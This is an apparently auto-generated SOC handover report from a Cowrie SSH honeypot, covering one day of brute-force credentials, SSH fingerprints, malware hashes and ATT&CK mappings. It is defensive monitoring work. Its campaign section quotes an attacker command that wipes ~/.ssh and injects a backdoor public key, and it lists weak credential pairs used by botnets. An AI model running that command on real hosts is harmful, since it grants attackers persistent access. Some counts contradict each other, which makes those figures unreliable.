# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T20:36:06Z |
| **Shift Time** | 20:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **153** |
| Confirmed Threats | **0** |
| False Positives Filtered | **153** (100.0%) |
| Unique Attacker IPs | **69** |
| Countries of Origin | **0** |
| High Severity Cases | **77** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **76** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **104** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **17** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **86** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `user` | 17 |
| `ubuntu` | 12 |
| `support` | 10 |
| `debian` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support222` | 6 |
| `9999999` | 6 |
| `55` | 6 |
| `2` | 6 |
| `777777` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support222` | 6 |
| `user` | `9999999` | 6 |
| `admin` | `55` | 6 |
| `user` | `2` | 6 |
| `user` | `777777` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `default` | `default88` | `10.0.0.73` | 2026-08-24T16:55:20 |
| `newuser` | `123123` | `24.122.136.94` | 2026-08-24T16:58:11 |
| `345gs5662d34` | `345gs5662d34` | `24.122.136.94` | 2026-08-24T16:58:13 |
| `newuser` | `3245gs5662d34` | `24.122.136.94` | 2026-08-24T16:58:13 |
| `ubuntu` | `q1w2e3r4t5` | `217.60.255.130` | 2026-08-24T17:03:21 |
| `root` | `abc123!` | `217.60.255.130` | 2026-08-24T17:03:24 |
| `user` | `777777` | `10.0.0.73` | 2026-08-24T17:03:58 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T17:04:54 |
| `operator` | `operator111` | `178.178.194.123` | 2026-08-24T17:07:54 |
| `default` | `default88` | `196.216.81.126` | 2026-08-24T17:11:36 |
| `default` | `default88` | `103.83.23.169` | 2026-08-24T17:11:44 |
| `ubuntu` | `1Qaz2wsx` | `217.60.255.130` | 2026-08-24T17:12:53 |
| `root` | `asiatech1234` | `217.60.255.130` | 2026-08-24T17:12:58 |
| `root` | `Naruto123` | `101.96.193.131` | 2026-08-24T17:13:35 |
| `345gs5662d34` | `345gs5662d34` | `101.96.193.131` | 2026-08-24T17:13:39 |
| `root` | `3245gs5662d34` | `101.96.193.131` | 2026-08-24T17:13:41 |
| `test` | `333333` | `65.20.143.19` | 2026-08-24T17:16:36 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-24T17:17:22 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-24T17:17:22 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-24T17:17:27 |
| `user` | `777777` | `87.103.126.54` | 2026-08-24T17:21:24 |
| `user` | `777777` | `58.57.154.146` | 2026-08-24T17:21:33 |
| `user` | `777777` | `65.20.153.146` | 2026-08-24T17:21:37 |
| `user` | `777777` | `112.28.153.240` | 2026-08-24T17:21:46 |
| `ubuntu` | `5tgb^YHN` | `217.60.255.130` | 2026-08-24T17:22:13 |
| `root` | `Siamak@123` | `217.60.255.130` | 2026-08-24T17:22:16 |
| `support` | `support222` | `10.0.0.73` | 2026-08-24T17:23:17 |
| `support` | `support222` | `159.224.97.134` | 2026-08-24T17:24:47 |
| `support` | `support222` | `124.239.129.2` | 2026-08-24T17:24:57 |
| `test` | `333333` | `10.0.0.73` | 2026-08-24T17:27:28 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T17:29:42 |
| `ubuntu` | `Yy123456` | `217.60.255.130` | 2026-08-24T17:31:49 |
| `root` | `admin@123!` | `217.60.255.130` | 2026-08-24T17:31:53 |
| `GET / HTTP/1.0` | `Host: 129.80.119.236` | `165.154.29.189` | 2026-08-24T17:35:12 |
| `USER test` | `USER test` | `165.154.29.189` | 2026-08-24T17:35:24 |
| `OPTIONS rtsp://129.80.119.236 RTSP/1.0` | `CSeq:1` | `165.154.29.189` | 2026-08-24T17:35:29 |
| `user` | `9999999` | `10.0.0.73` | 2026-08-24T17:36:11 |
| `support` | `support222` | `146.158.98.4` | 2026-08-24T17:40:16 |
| `support` | `support222` | `34.146.217.105` | 2026-08-24T17:40:24 |
| `ubuntu` | `sa` | `217.60.255.130` | 2026-08-24T17:41:38 |
| `root` | `!QAZ@2wsx` | `217.60.255.130` | 2026-08-24T17:41:41 |
| `test` | `333333` | `210.71.208.175` | 2026-08-24T17:43:36 |
| `test` | `333333` | `45.170.50.2` | 2026-08-24T17:43:44 |
| `debian` | `22222` | `178.178.194.135` | 2026-08-24T17:48:38 |
| `debian` | `22222` | `170.233.29.157` | 2026-08-24T17:48:47 |
| `ubuntu` | `Hallo123` | `217.60.255.130` | 2026-08-24T17:51:15 |
| `root` | `123@abc` | `217.60.255.130` | 2026-08-24T17:51:19 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T17:51:53 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T17:51:53 |
| `user` | `9999999` | `81.215.2.43` | 2026-08-24T17:53:27 |
| `user` | `9999999` | `222.92.61.242` | 2026-08-24T17:53:37 |
| `user` | `9999999` | `78.192.21.78` | 2026-08-24T17:53:39 |
| `user` | `9999999` | `59.120.8.61` | 2026-08-24T17:53:51 |
| `blank` | `blank444` | `10.0.0.73` | 2026-08-24T17:55:51 |
| `blank` | `blank444` | `124.133.10.66` | 2026-08-24T17:57:28 |
| `blank` | `blank444` | `124.239.129.2` | 2026-08-24T17:57:37 |
| `debian` | `22222` | `10.0.0.73` | 2026-08-24T17:59:21 |
| `ubuntu` | `Mohammed@123` | `217.60.255.130` | 2026-08-24T18:00:45 |
| `root` | `shetab@123` | `217.60.255.130` | 2026-08-24T18:00:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.118` | 2026-08-24T18:07:48 |
| `admin` | `55` | `10.0.0.73` | 2026-08-24T18:08:13 |
| `ubuntu` | `@dmin@1234` | `217.60.255.130` | 2026-08-24T18:10:14 |
| `root` | `Nn@123` | `217.60.255.130` | 2026-08-24T18:10:18 |
| `debian` | `22222` | `189.51.96.71` | 2026-08-24T18:15:49 |
| `ubuntu` | `qwer!@#$` | `217.60.255.130` | 2026-08-24T18:19:30 |
| `root` | `boeing747` | `217.60.255.130` | 2026-08-24T18:19:34 |
| `admin` | `55` | `107.135.117.245` | 2026-08-24T18:25:27 |
| `admin` | `55` | `210.95.231.219` | 2026-08-24T18:25:36 |
| `admin` | `55` | `121.159.71.249` | 2026-08-24T18:25:42 |
| `admin` | `55` | `213.126.221.10` | 2026-08-24T18:25:50 |
| `user` | `2` | `10.0.0.73` | 2026-08-24T18:28:29 |
| `ubuntu` | `Alireza@123` | `217.60.255.130` | 2026-08-24T18:29:06 |
| `root` | `!@#123QWEqwe` | `217.60.255.130` | 2026-08-24T18:29:10 |
| `user` | `2` | `43.250.106.18` | 2026-08-24T18:30:03 |
| `user` | `2` | `23.30.11.253` | 2026-08-24T18:30:10 |
| `debian` | `debian22` | `10.0.0.73` | 2026-08-24T18:31:14 |
| `root` | `﻿------fuck------` | `120.26.202.34` | 2026-08-24T18:38:08 |
| `ubuntu` | `Javad@1404` | `217.60.255.130` | 2026-08-24T18:38:47 |
| `root` | `a1s2d3f4` | `217.60.255.130` | 2026-08-24T18:38:50 |
| `admin` | `3333` | `10.0.0.73` | 2026-08-24T18:39:57 |
| `user` | `2` | `189.56.0.19` | 2026-08-24T18:45:35 |
| `user` | `2` | `49.36.81.138` | 2026-08-24T18:45:44 |
| `debian` | `debian22` | `172.3.132.73` | 2026-08-24T18:47:35 |
| `ubuntu` | `Mehrdad@123` | `217.60.255.130` | 2026-08-24T18:48:12 |
| `root` | `zaq12wsx!` | `217.60.255.130` | 2026-08-24T18:48:15 |
| `ubnt` | `ubnt333` | `200.222.71.218` | 2026-08-24T18:52:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **153** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 36 |
| libssh | 36 |
| Go SSH scanner | 8 |
| Paramiko (Python) | 6 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 34 | 33 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 34 | 33 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.96.193.131`, `24.122.136.94`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **69** |
| Unique ASNs | **51** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | LOW |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS398324` | Censys, Inc. | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | LOW |
| `AS3462` | Data Communication Business Group | 2 | LOW |
| `AS7018` | AT&T Enterprises, LLC | 2 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 77 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (153 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 153 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
| Tool 34  | Credential Extractor        | ✅ 104 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 153 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T20:36:06Z_
